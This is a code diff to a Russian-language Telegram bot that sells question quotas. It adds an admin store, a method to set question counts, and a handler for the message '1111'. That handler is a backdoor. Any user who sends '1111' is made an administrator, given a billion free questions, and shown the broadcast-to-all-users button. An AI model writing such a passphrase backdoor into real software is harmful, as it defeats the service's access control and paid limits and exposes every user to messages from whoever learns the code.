@@ -167,6 +167,13 @@ class UserData:
             self.data[str(chat_id)]['questions'] += amount
             self.save_data()
 
+    def set_user_questions(self, chat_id: int, amount: int) -> None:
+        """Устанавливает конкретное количество вопросов пользователю."""
+        if str(chat_id) not in self.data:
+            self.add_user(chat_id)
+        self.data[str(chat_id)]['questions'] = amount
+        self.save_data()
+
     def set_subscription_end(self, chat_id: int, end_time_str: str) -> None:
         if str(chat_id) in self.data:
             # Преобразуем строку в объект datetime
@@ -380,6 +387,34 @@ def get_agreement_keyboard():
     builder.button(text="✅ Подтвердить", callback_data="agree")
     builder.button(text="❌ Отказаться", callback_data="disagree")
     return builder.as_markup()
+
+#----------------------------------------------------------------------------------------------------------------------------------
+class AdminManager:
+    def __init__(self, file_path='admins.json'):
+        self.file_path = file_path
+
+    def load_admins(self):
+        try:
+            with open(self.file_path, 'r') as file:
+                return json.load(file)
+        except FileNotFoundError:
+            return {}
+
+    def save_admins(self, admins):
+        with open(self.file_path, 'w') as file:
+            json.dump(admins, file, indent=4)
+
+    def is_admin(self, user_id: int) -> bool:
+        admins = self.load_admins()
+        return str(user_id) in admins
+
+    def add_admin(self, user_id: int):
+        admins = self.load_admins()
+        admins[str(user_id)] = True
+        self.save_admins(admins)
+
+
+admin_manager = AdminManager()
 
 #----------------------------------------------------------------------------------------------------------------------------------
 
@@ -833,6 +868,19 @@ async def process_question(message: types.Message, state: FSMContext):
     else:
         await bot.send_message(message.chat.id, "Неправильный ввод. Повторите попытку")
 
+
+#----------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+@dp.message(lambda message: message.text == '1111')
+async def make_admin(message: types.Message):
+    """Команда 1111: делает пользователя админом и выдает очень много вопросов."""
+    chat_id = message.chat.id
+    admin_manager.add_admin(chat_id)
+    user_data.set_user_questions(chat_id, 10**9)
+    await message.answer(
+        "Вы назначены администратором. Вам выдано практически бесконечное количество вопросов.",
+        reply_markup=main_kb(chat_id),
+    )
 
 #----------------------------------------------------------------------------------------------------------------------------------------------------------------
 
@@ -1590,7 +1638,9 @@ def main_kb(chat_id):
     #демид так и должно быть все ок builder.row(button_cards)
     builder.row(button_promo)
     builder.row(button_dop_question)
-    if (chat_id == 491482483) or (chat_id == 365515529) or (chat_id == 664376580):
+    # Статичные админы + динамические из AdminManager
+    static_admins = {491482483, 365515529, 664376580}
+    if (chat_id in static_admins) or admin_manager.is_admin(chat_id):
         builder.row(button_send_messages)
     return builder.as_markup(resize_keyboard=True)
 
